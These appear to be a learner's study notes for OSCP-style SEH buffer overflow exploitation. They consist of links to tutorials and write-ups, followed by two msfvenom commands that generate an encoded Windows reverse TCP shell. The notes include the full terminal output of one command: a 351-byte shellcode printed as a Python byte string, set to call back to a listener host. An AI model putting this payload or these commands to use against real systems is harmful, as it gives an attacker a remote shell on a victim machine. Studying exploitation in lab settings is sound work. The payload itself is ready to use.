https://github.com/spaceyowie/oscp-bof/blob/main/badchars_check.py

https://fuzzysecurity.com/tutorials/expDev/3.html

https://areyou1or0.it/index.php/2021/02/10/my-osce-experience/

https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/

https://github.com/killvxk/Windows-Exploit-Development-practice/blob/master/Millenium-MP3-Studio-seh-calc.py

https://www.youtube.com/watch?v=MJz2GDL5B3o

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.18.14 LPORT=135 EXITFUNC=thread  -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x09\x0d\xff\x1a"

https://github.com/V1n1v131r4/OSCP-Buffer-Overflow

https://oscp.securable.nl/buffer-overflow

https://stackoverflow.com/questions/3580715/what-is-the-difference-between-step-into-and-step-over-in-a-debugger

https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/

https://windll.com/dll/microsoft-corporation/msvcr100

https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow

https://stackoverflow.com/questions/16687197/windbg-range-error-while-searching-jump

https://whitecr0wz.github.io/posts/Easy-RM-to-MP3-Converter/

https://www.youtube.com/watch?v=qc5-Yt2kCu8

https://www.youtube.com/watch?v=FYmfYOOrQ00

ernest@ernest-UX330UAK:~$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=136 -b "\x00\x0a\x09\x0d\xff\x1a" -f python -v payload -e x86/shikata_ga_nai
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xd9\xc7\xd9\x74\x24\xf4\x5a\x33\xc9\xb8\x0b\x94"
payload += b"\xbc\xea\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x49"
payload += b"\x87\x5e\x1f\xb1\x4f\x1c\xe0\x49\x90\x41\x68\xac"
payload += b"\xa1\x41\x0e\xa5\x92\x71\x44\xeb\x1e\xf9\x08\x1f"
payload += b"\x94\x8f\x84\x10\x1d\x25\xf3\x1f\x9e\x16\xc7\x3e"
payload += b"\x1c\x65\x14\xe0\x1d\xa6\x69\xe1\x5a\xdb\x80\xb3"
payload += b"\x33\x97\x37\x23\x37\xed\x8b\xc8\x0b\xe3\x8b\x2d"
payload += b"\xdb\x02\xbd\xe0\x57\x5d\x1d\x03\xbb\xd5\x14\x1b"
payload += b"\xd8\xd0\xef\x90\x2a\xae\xf1\x70\x63\x4f\x5d\xbd"
payload += b"\x4b\xa2\x9f\xfa\x6c\x5d\xea\xf2\x8e\xe0\xed\xc1"
payload += b"\xed\x3e\x7b\xd1\x56\xb4\xdb\x3d\x66\x19\xbd\xb6"
payload += b"\x64\xd6\xc9\x90\x68\xe9\x1e\xab\x95\x62\xa1\x7b"
payload += b"\x1c\x30\x86\x5f\x44\xe2\xa7\xc6\x20\x45\xd7\x18"
payload += b"\x8b\x3a\x7d\x53\x26\x2e\x0c\x3e\x2f\x83\x3d\xc0"
payload += b"\xaf\x8b\x36\xb3\x9d\x14\xed\x5b\xae\xdd\x2b\x9c"
payload += b"\xd1\xf7\x8c\x32\x2c\xf8\xec\x1b\xeb\xac\xbc\x33"
payload += b"\xda\xcc\x56\xc3\xe3\x18\xf8\x93\x4b\xf3\xb9\x43"
payload += b"\x2c\xa3\x51\x89\xa3\x9c\x42\xb2\x69\xb5\xe9\x49"
payload += b"\xfa\xc5\xed\x51\xfb\x51\xec\x51\xfb\x29\x79\xb7"
payload += b"\x91\x39\x2c\x60\x0e\xa3\x75\xfa\xaf\x2c\xa0\x87"
payload += b"\xf0\xa7\x47\x78\xbe\x4f\x2d\x6a\x57\xa0\x78\xd0"
payload += b"\xfe\xbf\x56\x7c\x9c\x52\x3d\x7c\xeb\x4e\xea\x2b"
payload += b"\xbc\xa1\xe3\xb9\x50\x9b\x5d\xdf\xa8\x7d\xa5\x5b"
payload += b"\x77\xbe\x28\x62\xfa\xfa\x0e\x74\xc2\x03\x0b\x20"
payload += b"\x9a\x55\xc5\x9e\x5c\x0c\xa7\x48\x37\xe3\x61\x1c"
payload += b"\xce\xcf\xb1\x5a\xcf\x05\x44\x82\x7e\xf0\x11\xbd"
payload += b"\x4f\x94\x95\xc6\xad\x04\x59\x1d\x76\x34\x10\x3f"
payload += b"\xdf\xdd\xfd\xaa\x5d\x80\xfd\x01\xa1\xbd\x7d\xa3"
payload += b"\x5a\x3a\x9d\xc6\x5f\x06\x19\x3b\x12\x17\xcc\x3b"
payload += b"\x81\x18\xc5"
